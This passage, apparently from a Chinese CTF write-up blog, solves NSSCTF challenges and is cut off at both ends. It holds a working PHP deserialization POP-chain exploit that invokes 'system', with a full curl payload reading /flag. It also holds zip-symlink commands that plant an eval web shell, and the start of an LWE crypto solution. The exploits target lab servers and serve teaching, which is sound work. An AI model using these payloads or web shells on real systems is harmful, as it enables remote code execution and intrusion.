class="string">&#x27;name&#x27;</span>]) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file_extension</span>;</span><br><span class="line">                <span class="variable">$upload_path</span> = <span class="variable">$upload_dir</span> . <span class="variable">$unique_filename</span>;</span><br><span class="line">                <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_path</span>)) &#123;</span><br><span class="line">                    <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-green-600&#x27;&gt;文件上传成功！&lt;/p&gt;&quot;</span>;</span><br><span class="line">                    <span class="variable">$output</span> .= <span class="string">&quot;&lt;p class=&#x27;text-gray-700&#x27;&gt;文件路径：&lt;code class=&#x27;bg-gray-200 p-1 rounded&#x27;&gt;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$upload_path</span>) . <span class="string">&quot;&lt;/code&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-red-600&#x27;&gt;上传失败！&lt;/p&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-red-600&#x27;&gt;请选择一个文件上传。&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;home&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit_md5&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$filename_param</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file_to_check&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;file_to_check&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$filename_param</span>)) &#123;</span><br><span class="line">        <span class="variable">$file_object</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$filename_param</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_object</span> === <span class="literal">false</span> || !(<span class="variable">$file_object</span> <span class="keyword">instanceof</span> FileManager)) &#123;</span><br><span class="line">            <span class="variable">$file_object</span> = <span class="keyword">new</span> <span class="title class_">FileManager</span>(<span class="variable">$filename_param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$output</span> = <span class="variable">$file_object</span>-&gt;<span class="title function_ invoke__">getFileHash</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-gray-600&#x27;&gt;请输入文件路径进行MD5校验。&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;文件管理系统&lt;/title&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.tailwindcss.com&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            font-family: <span class="string">&#x27;Inter&#x27;</span>, sans-serif;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body <span class="class"><span class="keyword">class</span>=&quot;<span class="title">bg</span>-<span class="title">gray</span>-100 <span class="title">flex</span> <span class="title">items</span>-<span class="title">center</span> <span class="title">justify</span>-<span class="title">center</span> <span class="title">min</span>-<span class="title">h</span>-<span class="title">screen</span> <span class="title">px</span>-4 <span class="title">py</span>-8&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">bg</span>-<span class="title">white</span> <span class="title">p</span>-6 <span class="title">md</span>:<span class="title">p</span>-8 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">shadow</span>-<span class="title">md</span> <span class="title">w</span>-<span class="title">full</span> <span class="title">max</span>-<span class="title">w</span>-4<span class="title">xl</span> <span class="title">mx</span>-<span class="title">auto</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h1</span> <span class="title">class</span>=&quot;<span class="title">text</span>-3<span class="title">xl</span> <span class="title">font</span>-<span class="title">bold</span> <span class="title">mb</span>-6 <span class="title">text</span>-<span class="title">gray</span>-800 <span class="title">text</span>-<span class="title">center</span>&quot;&gt;文件管理系统&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">flex</span> <span class="title">justify</span>-<span class="title">center</span> <span class="title">mb</span>-6 <span class="title">space</span>-<span class="title">x</span>-4&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">action</span>=<span class="title">home</span>&quot; <span class="title">class</span>=&quot;<span class="title">py</span>-2 <span class="title">px</span>-4 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">font</span>-<span class="title">semibold</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">action</span> === &#x27;<span class="title">home</span>&#x27; ? &#x27;<span class="title">bg</span>-<span class="title">indigo</span>-600 <span class="title">text</span>-<span class="title">white</span>&#x27; : &#x27;<span class="title">bg</span>-<span class="title">indigo</span>-100 <span class="title">text</span>-<span class="title">indigo</span>-800 <span class="title">hover</span>:<span class="title">bg</span>-<span class="title">indigo</span>-200&#x27;; ?&gt;&quot;&gt;主页&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">action</span>=<span class="title">upload_file</span>&quot; <span class="title">class</span>=&quot;<span class="title">py</span>-2 <span class="title">px</span>-4 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">font</span>-<span class="title">semibold</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">action</span> === &#x27;<span class="title">upload_file</span>&#x27; ? &#x27;<span class="title">bg</span>-<span class="title">blue</span>-600 <span class="title">text</span>-<span class="title">white</span>&#x27; : &#x27;<span class="title">bg</span>-<span class="title">blue</span>-100 <span class="title">text</span>-<span class="title">blue</span>-800 <span class="title">hover</span>:<span class="title">bg</span>-<span class="title">blue</span>-200&#x27;; ?&gt;&quot;&gt;上传文件&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">action</span> === &#x27;<span class="title">home</span>&#x27;): ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">lg</span> <span class="title">text</span>-<span class="title">gray</span>-700 <span class="title">mb</span>-4&quot;&gt;欢迎使用文件管理系统。&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">sm</span> <span class="title">text</span>-<span class="title">gray</span>-500 <span class="title">mb</span>-6&quot;&gt;</span></span><br><span class="line"><span class="class">                    为了确保文件一致性和完整性，请在下载前校验<span class="title">md5</span>值，完成下载后进行对比。</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">text</span>-2<span class="title">xl</span> <span class="title">font</span>-<span class="title">bold</span> <span class="title">mb</span>-4 <span class="title">text</span>-<span class="title">gray</span>-800&quot;&gt;文件列表&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">max</span>-<span class="title">h</span>-60 <span class="title">overflow</span>-<span class="title">y</span>-<span class="title">auto</span> <span class="title">border</span> <span class="title">border</span>-<span class="title">gray</span>-200 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">p</span>-2 <span class="title">bg</span>-<span class="title">gray</span>-50&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">                    $<span class="title">files</span> = <span class="title">array_diff</span>(<span class="title">scandir</span>($<span class="title">upload_dir</span>), <span class="title">array</span>(&#x27;.&#x27;, &#x27;..&#x27;));</span></span><br><span class="line"><span class="class">                    <span class="title">if</span> (<span class="title">empty</span>($<span class="title">files</span>)) </span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;&lt;p class=&#x27;text-gray-500&#x27;&gt;暂无文件。&lt;/p&gt;&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;&lt;ul class=&#x27;text-left space-y-2&#x27;&gt;&quot;</span>;</span><br><span class="line">                        <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">                            <span class="variable">$file_path</span> = <span class="variable">$upload_dir</span> . <span class="variable">$file</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;li class=&#x27;flex items-center justify-between p-2 bg-white rounded-md shadow-sm&#x27;&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;span class=&#x27;text-gray-700 break-all mr-2&#x27;&gt;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$file</span>) . <span class="string">&quot;&lt;/span&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;flex space-x-2&#x27;&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$file_path</span>) . <span class="string">&quot;&#x27; download class=&#x27;bg-blue-500 hover:bg-blue-600 text-white text-xs py-1 px-2 rounded-lg transition duration-300 ease-in-out&#x27;&gt;下载&lt;/a&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;form action=&#x27;?action=home&#x27; method=&#x27;POST&#x27; class=&#x27;inline-block&#x27;&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;file_to_check&#x27; value=&#x27;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$file_path</span>) . <span class="string">&quot;&#x27;&gt;&quot;</span>; </span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;button type=&#x27;submit&#x27; name=&#x27;submit_md5&#x27; class=&#x27;bg-purple-500 hover:bg-purple-600 text-white text-xs py-1 px-2 rounded-lg transition duration-300 ease-in-out&#x27;&gt;校验MD5&lt;/button&gt;&quot;</span>; </span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;/form&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;/li&gt;&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;&lt;/ul&gt;&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line">                &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">                <span class="meta">&lt;?php</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$output</span>)): <span class="meta">?&gt;</span></span><br><span class="line">                    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">mt</span>-6 <span class="title">p</span>-4 <span class="title">bg</span>-<span class="title">gray</span>-50 <span class="title">border</span> <span class="title">border</span>-<span class="title">gray</span>-200 <span class="title">rounded</span>-<span class="title">lg</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">lg</span> <span class="title">font</span>-<span class="title">semibold</span> <span class="title">mb</span>-2 <span class="title">text</span>-<span class="title">gray</span>-800&quot;&gt;校验结果:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">output</span>; ?&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">elseif</span> ($<span class="title">action</span> === &#x27;<span class="title">upload_file</span>&#x27;): ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">text</span>-2<span class="title">xl</span> <span class="title">font</span>-<span class="title">bold</span> <span class="title">mb</span>-4 <span class="title">text</span>-<span class="title">gray</span>-800 <span class="title">text</span>-<span class="title">center</span>&quot;&gt;上传文件&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">form</span> <span class="title">action</span>=&quot;?<span class="title">action</span>=<span class="title">upload_file</span>&quot; <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot; <span class="title">class</span>=&quot;<span class="title">space</span>-<span class="title">y</span>-4&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">upload_file</span>&quot; <span class="title">class</span>=&quot;<span class="title">block</span> <span class="title">text</span>-<span class="title">gray</span>-700 <span class="title">text</span>-<span class="title">sm</span> <span class="title">font</span>-<span class="title">bold</span> <span class="title">mb</span>-2&quot;&gt;选择文件:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">upload_file</span>&quot; <span class="title">id</span>=&quot;<span class="title">upload_file</span>&quot; <span class="title">class</span>=&quot;<span class="title">block</span> <span class="title">w</span>-<span class="title">full</span> <span class="title">text</span>-<span class="title">sm</span> <span class="title">text</span>-<span class="title">gray</span>-900 <span class="title">border</span> <span class="title">border</span>-<span class="title">gray</span>-300 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">cursor</span>-<span class="title">pointer</span> <span class="title">bg</span>-<span class="title">gray</span>-50 <span class="title">focus</span>:<span class="title">outline</span>-<span class="title">none</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">w</span>-<span class="title">full</span> <span class="title">bg</span>-<span class="title">blue</span>-500 <span class="title">hover</span>:<span class="title">bg</span>-<span class="title">blue</span>-600 <span class="title">text</span>-<span class="title">white</span> <span class="title">font</span>-<span class="title">semibold</span> <span class="title">py</span>-2 <span class="title">px</span>-4 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">transition</span> <span class="title">duration</span>-300 <span class="title">ease</span>-<span class="title">in</span>-<span class="title">out</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    上传</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">if</span> (!<span class="title">empty</span>($<span class="title">output</span>)): ?&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">mt</span>-6 <span class="title">p</span>-4 <span class="title">bg</span>-<span class="title">gray</span>-50 <span class="title">border</span> <span class="title">border</span>-<span class="title">gray</span>-200 <span class="title">rounded</span>-<span class="title">lg</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">lg</span> <span class="title">font</span>-<span class="title">semibold</span> <span class="title">mb</span>-2 <span class="title">text</span>-<span class="title">gray</span>-800&quot;&gt;上传结果:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">output</span>; ?&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">mt</span>-6 <span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">sm</span> <span class="title">text</span>-<span class="title">gray</span>-500&quot;&gt;</span></span><br><span class="line"><span class="class">                只允许上传 .<span class="title">txt</span>, .<span class="title">png</span>, .<span class="title">gif</span>, .<span class="title">jpg</span> 文件。</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>两个功能：上传和<strong>文件MD5校验</strong><br>漏洞出现在<code>$file_object = @unserialize($filename_param);</code><br><strong>POP链构造</strong>：</p><ul><li>链尾</li></ul><p>类<code>ContentProcessor</code>出现了<code>($_POST[&#39;cmd&#39;])</code>我们不难猜测，前面的<code>$this-&gt;callbackFunction</code>可以构造<code>system</code>函数</p><p><code>$this-&gt;$key</code>就是类<code>FunctionInvoker</code>了，它只有<code>__call</code>方法，前面构造的<code>system</code>函数就能触发</p><ul><li>链首</li></ul><p>那么谁来触发<code>__get</code>呢？<br>我们知道反序列化的入口是<code>FileManager-&gt;getFileHash()</code>，<code>$md5_hash = md5_file($this-&gt;targetFile)</code> <code>else if (is_object($this-&gt;targetFile))</code>正好我们传入对象时，PHP的<code>md5_file</code>会把对象自动转化为字符串，从而触发<code>__toString</code></p><ul><li>中间</li></ul><p>注意到<code>$this-&gt;$method($var)</code>，观察<code>var</code>的位置，<code>performWriteOperation</code>可以作为<code>method</code>，<code>$targetObject = $this-&gt;targetFile; $value = $targetObject-&gt;$var;</code> <code>$var</code>可以指向<code>private $processedContent;</code>来触发链尾的<code>__get</code>。</p><p><code>FileManager::__toString() -&gt; FileManager::performWriteOperation() -&gt; ContentProcessor::__get()</code></p><p>这里出现了两次<code>$this-&gt;targetFile;</code>，第一次是用来触发<code>__toString</code>的，第二次才是触发<code>__get</code>的<br>PS：<code>$this</code>指的是当前，是实时变化的</p><p>确保<code>submit_md5</code>不为空，进入正确的判断分支，<code>file_to_check</code>为我们反序列化的<code>payload</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要定义题目中所有的类，以确保序列化正常</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ApplicationContext</span> </span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FunctionInvoker</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ContentProcessor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$processedContent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$callbackFunction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;processedContent = <span class="keyword">new</span> <span class="title class_">FunctionInvoker</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$targetFile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$responseData</span> = <span class="string">&#x27;default_response&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---- 开始构建POP链 ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 链条末端：创建ContentProcessor对象，设置回调函数为system</span></span><br><span class="line"><span class="variable">$cp</span> = <span class="keyword">new</span> <span class="title class_">ContentProcessor</span>();</span><br><span class="line"><span class="variable">$cp</span>-&gt;callbackFunction = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 中间环节：创建内部FileManager对象，其targetFile指向$cp</span></span><br><span class="line"><span class="variable">$fm2</span> = <span class="keyword">new</span> <span class="title class_">FileManager</span>();</span><br><span class="line"><span class="variable">$fm2</span>-&gt;targetFile = <span class="variable">$cp</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 链条起点：创建外部FileManager对象，其targetFile指向$fm2</span></span><br><span class="line"><span class="variable">$fm1</span> = <span class="keyword">new</span> <span class="title class_">FileManager</span>();</span><br><span class="line"><span class="variable">$fm1</span>-&gt;targetFile = <span class="variable">$fm2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 序列化最终的对象</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$fm1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;URL编码后的Payload:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">curl -X POST <span class="string">&#x27;http://node8.anna.nssctf.cn:23190/?action=home&#x27;</span> -d <span class="string">&quot;submit_md5=1&amp;method=performWriteOperation&amp;var=processedContent&amp;cmd=cat /flag&amp;file_to_check=O%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A16%3A%22ContentProcessor%22%3A2%3A%7Bs%3A34%3A%22%00ContentProcessor%00processedContent%22%3BO%3A15%3A%22FunctionInvoker%22%3A0%3A%7B%7Ds%3A16%3A%22callbackFunction%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A12%3A%22responseData%22%3Bs%3A16%3A%22default_response%22%3B%7Ds%3A12%3A%22responseData%22%3Bs%3A16%3A%22default_response%22%3B%7D&quot;</span></span><br></pre></td></tr></table></figure><h2 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload*"></a>ez_upload*</h2><p>得把<strong>报错信息</strong>搞出来，然后参考<code>ciscn2023 unzip</code>，<strong>打软链接</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -s /var/www/html <span class="built_in">link</span></span><br><span class="line">zip --symlinks 1.zip <span class="built_in">link</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="built_in">link</span></span><br><span class="line"><span class="built_in">mkdir</span> <span class="built_in">link</span></span><br><span class="line"><span class="built_in">cd</span> <span class="built_in">link</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php @eval(<span class="variable">$_GET</span>[&#x27;shell&#x27;]) ?&gt;&quot;</span> &gt; shell.php</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">zip -r 2.zip <span class="built_in">link</span></span><br></pre></td></tr></table></figure><p>依次上传<code>1.zip 2.zip</code>，访问<code>url/shell.php?shell=system(ls /);</code><br>因为第二个压缩包会覆盖掉上一个的link目录，而link目录软链接指向了<code>/var/www/html</code>，第二次解压就会把<code>shell.php</code>，解压到<code>/var/www/html</code>目录下面</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Guillotine"><a href="#Guillotine" class="headerlink" title="Guillotine"></a>Guillotine</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;NSSCTF&#123;**************************&#125;&#x27;</span></span><br><span class="line">p, n, m = <span class="number">257</span>, <span class="number">36</span>, <span class="number">50</span></span><br><span class="line">e = [choice(<span class="built_in">range</span>(-<span class="number">3</span>,<span class="number">4</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line">secret = random.randrange(<span class="number">1</span>,<span class="number">2</span>^n)</span><br><span class="line"></span><br><span class="line">random.seed(<span class="built_in">int</span>(<span class="number">1337</span>))</span><br><span class="line">A = [[[random.randrange(p) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line">B = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> time <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    b = (<span class="built_in">sum</span>(A[time][j][(secret &gt;&gt; j) &amp; <span class="number">1</span>] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n))+e[time])%p</span><br><span class="line">    B.append(b)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;give you B:&quot;</span>,B)</span><br><span class="line"></span><br><span class="line">alarm(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The time for defiance is over. Provide the encryption key, and you shall be granted the mercy of a swift end. Refuse, and your death will be prolonged.&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)) == secret</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Do you really think I would let you go? <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>e</code>是随机的小误差<code>[-3,3]</code><br>A是个三维数组</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    [</span><br><span class="line">        [,],</span><br><span class="line">        *<span class="number">36</span></span><br><span class="line">        [,]</span><br><span class="line">    ],</span><br><span class="line">    *<span class="number">50</span></span><br><span class="line">    [</span><br><span class="line">        [,],</span><br><span class="line">        ...</span><br><span class="line">        [,]</span><br><span class="line">    ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>这里<strong>随机数种子固定</strong>，因此<code>A</code>是已知的(不知道为什么<code>sage</code>跑不了<code>random</code>，用<code>Python</code>跑完直接套进去即可)</p><p><code>b</code>就是看<code>secret(36位)</code>移位后的奇偶情况决定取最小的数组里面的第零个还是第一个，并求和，最后再加上一个误差e再模p</p><p>到这一步就要朝<strong>LWE</strong>方向思考了，形如<code>B=A·s+e</code>，但目前无法构造这样的等式</p><p>有个小技巧</p><script type="math/tex; mode=display">因为s_{j}=0/1有，A_{i,j,s_{j}}=A_{i,j,0}·(1-s_{j})+A_{i,j,1}·s_{j}</script><script type="math/tex; mode=display">b_{i}\equiv \left(\sum_{j=0}^{n-1}(A_{i,j,0}+s_{j}·(A_{i,j,1}-A_{i,j,0}))+e_{i}\right)\pmod{p}</script><script type="math/tex; mode=display">b_{i}-\sum_{j=0}^{n-1}(A_{i,j,0})\equiv \left(\sum_{j=0}^{n-1}s_{j}·(A_{i,j,1}-A_{i,j,0})+e_{i}\right)\pmod{p}</script><script type="math/tex; 